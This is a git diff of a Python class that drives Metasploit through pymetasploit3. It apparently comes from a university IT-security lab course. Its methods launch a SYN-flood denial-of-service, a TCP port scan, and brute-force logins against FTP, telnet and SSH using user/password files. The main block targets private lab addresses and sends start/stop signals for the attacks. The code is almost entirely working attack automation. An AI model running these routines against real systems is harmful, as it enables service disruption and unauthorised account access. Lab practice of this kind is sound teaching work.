@@ -1,4 +1,6 @@
 from pymetasploit3.msfrpc import MsfRpcClient
+from packet import send_packet
+
 class Metasploit:
     def __init__(self):
         # The MsfRpcClient class provides the core functionality to navigate through the Metasploit framework.
@@ -10,14 +12,19 @@ class Metasploit:
         exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
         exploit['RHOSTS'] = ip
         print(exploit.description)
-        exploit.execute()
-        print(self.client.sessions.list)
+        #exploit.execute()
+        #print(self.client.sessions.list)
+        cid = self.client.consoles.console().cid # Create a new console and store its number in 'cid'
+        print(self.client.consoles.console(cid).run_module_with_output(exploit))
 
     def tcp_portscan_attack(self, ip: str):
-        exploit = self.client.modules.use('auxiliary', 'auxiliary/scanner/portscan/tcp')
+        exploit = self.client.modules.use('auxiliary', 'scanner/portscan/tcp')
         exploit['RHOSTS'] = ip
-        print(exploit.description)
-        exploit.execute()
+        #print(exploit.description)
+        #print(exploit.execute())
+
+        cid = self.client.consoles.console().cid # Create a new console and store its number in 'cid'
+        print(self.client.consoles.console(cid).run_module_with_output(exploit))
 
     # Brute-force login attack on ftp, telnet and ssh
     def brute_force_login(self, ip: str, port: str):
@@ -28,9 +35,13 @@ class Metasploit:
         elif(port == 'ssh'):
             exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
         exploit['RHOSTS'] = ip
-        exploit['PASS_FILE'] = './telnet_default_pass.txt'
-        print(exploit.description)
-        exploit.execute()
+        #exploit['PASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/telnet_default_pass.txt'
+        exploit['USERPASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/user_pass.txt'
+
+        cid = self.client.consoles.console().cid # Create a new console and store its number in 'cid'
+        print(self.client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))
+        # print(exploit.description)
+        # exploit.execute()
 
 
     # Use dir(client) to see the callable methods.
@@ -48,6 +59,10 @@ class Metasploit:
     #print(exploit.description)
 
 if __name__ == "__main__":
-    metaspl = Metasploit()
-    metaspl.dos_attack('10.47.1.62')
+    #metaspl = Metasploit()
+    send_packet("brute", "192.168.12.251", "start")
+    #metaspl.tcp_portscan_attack('192.168.12.251')
+    #metaspl.brute_force_login('192.168.12.251', 'telnet')
+    #metaspl.dos_attack('192.168.12.251')
+    send_packet("dos", "192.168.12.251", "stop")
     #metaspl.brute_force_login('127.0.0.1', 'ssh')
